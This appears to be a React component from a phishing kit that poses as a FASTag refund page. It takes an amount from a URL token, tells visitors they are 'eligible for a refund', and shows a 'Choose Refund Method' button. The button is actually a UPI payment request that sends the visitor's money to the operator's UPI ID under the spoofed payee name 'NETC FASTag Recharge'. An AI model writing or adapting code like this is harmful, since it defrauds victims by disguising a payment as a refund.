import React from "react";
import { useLocation } from "react-router-dom";
import Header from "../components/Header";
import { FaMoneyBillWave } from "react-icons/fa";
import siteConfig from "../config/siteConfig";

const Refund = () => {
  const location = useLocation();

  // Get query param value
  const getQueryParam = (key) => {
    return new URLSearchParams(location.search).get(key);
  };

  // Extract middle digits as amount
  const extractAmount = () => {
    const token = getQueryParam("token") || "";
    if (token.length <= 8) return 0; // not enough digits
    const middle = token.slice(4, -4); // remove 4 from start and 4 from end
    const amount = parseInt(middle);
    return isNaN(amount) ? 0 : amount;
  };

  const refundAmount = extractAmount();

  const upiLink = `upi://pay?ver=01&mode=01&pa=${siteConfig.upiIds[0]}&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04&am=${refundAmount}`;

  return (
    <div className="min-h-screen bg-gray-100">
      <Header />
      <div className="flex justify-center items-center py-20 px-4">
        <div className="p-10 w-full max-w-md text-center ">
          <div className="flex justify-center mb-6">
            <FaMoneyBillWave className="text-green-500 text-5xl" />
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-2">Refund Process</h1>
          <p className="text-gray-600 mb-6">
            You are eligible for a{" "}
            <span className="font-semibold text-green-600">₹{refundAmount}</span> refund.
          </p>
          <a
            href={upiLink}
            className="block bg-green-600 text-white px-6 py-2 rounded-lg hover:bg-green-700 transition w-full"
          >
            Choose Refund Method
          </a>
          <div className="mt-6 text-sm text-gray-500">
            <p>Refunds are processed instantly via UPI.</p>
            <p className="mt-2">
              Need help?{" "}
              <a href="/contact" className="text-blue-600 hover:underline">
                Contact Support
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Refund;
